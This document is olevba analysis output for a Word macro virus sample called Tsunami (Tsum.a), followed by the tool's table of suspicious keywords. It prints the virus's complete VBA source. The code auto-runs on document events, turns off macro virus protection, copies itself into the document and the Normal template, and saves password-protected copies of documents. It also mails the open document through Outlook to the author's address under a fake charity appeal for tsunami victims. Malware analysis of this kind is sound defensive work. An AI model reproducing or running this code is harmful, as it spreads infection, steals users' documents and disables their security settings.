olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tsum.a-58ba7bb04a55532cdd13188c2829d488c019e911
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tsum.a-58ba7bb04a55532cdd13188c2829d488c019e911 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO tsunami.bas 
in file: Virus.MSWord.Tsum.a-58ba7bb04a55532cdd13188c2829d488c019e911 - OLE stream: 'Macros/VBA/tsunami'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' hi there you have been attacked by tsunami
' to get the rid of tsunami drop me a mail at
' tsunami.india@indiatimes.com

Sub AutoExec()
    On Error Resume Next
    Call link2file
End Sub

Sub AutoNew()
    On Error Resume Next
    Call link2file
End Sub

Sub AutoClose()
    On Error Resume Next
    Call link2file
    Call saveATTACK
    Call doTSUNAMI
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

Sub AutoExit()
    On Error Resume Next
    Call link2file
    Call saveATTACK
    Call doTSUNAMI
End Sub

Sub AutoOpen()
    On Error Resume Next
    Call link2file
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Sub inspDIR()
    Dim MyFile, MyPath, MyName
    On Error Resume Next
    
    MyPath = "c:\tsunami"
    MyName = Dir(MyPath, vbDirectory)
    
    If MyName = "" Then
     MkDir "c:\tsunami"
    End If
   
End Sub

Sub saveATTACK()
    Dim no_of_docs, file1
    Dim myDate, myTime
    
    On Error Resume Next
    
    no_of_docs = Application.Documents.Count
    If no_of_docs < 1 Then Exit Sub
    
    myDate = Date
    myTime = Time
    
    s1 = Trim(Format(myDate, "dd-mmm-yyyy"))
    s2 = Trim(Format(myTime, "hh-mm-ss AMPM"))
    
    file1 = s1 + "(" + s2 + ")"
    
    Call inspDIR
    
    path1 = "c:\tsunami\" + file1 + ".doc"
  
  ' this is ver 2.0 of my previous script "Sapattra"
  ' if you still fill safe, wait i am going something real TSUNAMI
  ' be fill free to write to me at :   tsunami.india@indiatimes.com
  ' go ahead and donate for tsunami victims.
  
  
    ActiveDocument.SaveAs FileName:=path1, FileFormat:=wdFormatDocument, _
        LockComments:=False, Password:="tsunami2004", AddToRecentFiles:=True, WritePassword _
        :="", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:=False, _
        SaveNativePictureFormat:=False, SaveFormsData:=False, SaveAsAOCELetter:= _
        False
   
   Call doTEXT
   Call doTSUNAMI
End Sub


Function check2attack(location As Integer) As Boolean
    Dim mfile, ccount, index, filePROJ
    Dim signflag As Boolean
    Dim sigunature As String
    
    On Error Resume Next
    
    CommandBars("Tools").Controls("Macro").Enabled = False
   
    Application.DisplayAlerts = wdAlertsNone
    Application.ScreenUpdating = False
    Application.EnableCancelKey = wdCancelInterrupt
    Options.VirusProtection = False
    mfile = "c:\b00tlog.txt"
    signature = "tsunami"
    signflag = False
    
    If Application.Documents.Count < 1 Then
      check2attack = False
      Exit Function
    End If
    
    Select Case location
      Case 1: Set filePROJ = ActiveDocument.VBProject
      Case 2: Set filePROJ = NormalTemplate.VBProject

      Case Else:
    End Select
    
    ccount = filePROJ.VBComponents.Count
    For i% = 1 To ccount
        mm$ = filePROJ.VBComponents.Item(i%).Name
        If Trim(mm$) = signature Then signflag = True
    Next i%
  
    check2attack = signflag
  
err_lbl:
End Function


Sub link2file()
    Dim ld, ln, mfile
        
    On Error Resume Next
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    
    'check for document
        ld = check2attack(1)
    
    'check for normal template
        ln = check2attack(2)
    
    mfile = "c:\b00tlog.txt"
    
    If (ln And ld) Then
      'module is attached hence exit
      GoTo exit_label_2
    End If
    
    If (ld = False) Then
     'module is not attached to active document the attach to it
      Word.NormalTemplate.VBProject.VBComponents.Item("tsunami").Export mfile
      Word.ActiveDocument.VBProject.VBComponents.Import mfile
      Kill mfile
      ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
    End If
    
    If (ln = False) Then
     'module is not attached to active document the attach to it
     Word.ActiveDocument.VBProject.VBComponents.Item("tsunami").Export mfile
     Word.NormalTemplate.VBProject.VBComponents.Import mfile
     Kill mfile
     NormalTemplate.Save
    End If
    
    
    ActiveDocument.PrintOut
    
exit_label_2:
End Sub
'-----------------------------------------------

Sub doTSUNAMI()
    
    On Error Resume Next
    
    Call SendDocumentAsAttachment
    
    ActiveDocument.HasRoutingSlip = True
    With ActiveDocument.RoutingSlip
        .Subject = "Help Victims of TSUNAMI of India!!!"
        .AddRecipient "tsunami.india@indiatimes.com"
        .Delivery = wdAllAtOnce
    End With
    ActiveDocument.Route

End Sub


Sub SendDocumentAsAttachment()

    Dim bStarted As Boolean
    Dim oOutlookApp
    Dim oItem
    
    On Error Resume Next
    
  
    Set oOutlookApp = GetObject(, "Outlook.Application")
    If Err <> 0 Then
        Set oOutlookApp = CreateObject("Outlook.Application")
        bStarted = True
    End If
    
    Set oItem = oOutlookApp.CreateItem(olMailItem)
    
    With oItem
        .To = "tsunami.india@indiatimes.com"
        .Subject = "Help Victims of TSUNAMI INDIA!!!"
        .Attachments.Add Source:=ActiveDocument.FullName, Type:=olByValue, DisplayName:="Please find attached file."
        .Send
    End With
    
    If bStarted Then
        oOutlookApp.Quit
    End If
    
    Set oItem = Nothing
    Set oOutlookApp = Nothing
    
End Sub
 
 '-------------------------------------------------------------
 Sub doTEXT()
    On Error Resume Next
     Selection.InsertBreak Type:=wdPageBreak
    Selection.TypeText Text:="Have a nice day .......!"
    Selection.HomeKey Unit:=wdLine, Extend:=wdExtend
    With Selection.Font
        .NameAscii = "Arial"
        .NameOther = "Arial"
        .Name = "Arial"
        .Size = 36
        .Bold = False
        .Animation = wdAnimationSparkleText
        .DisableCharacterSpaceGrid = False
        .EmphasisMark = wdEmphasisMarkNone
    End With
End Sub
'-----------------------------------------------------------

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

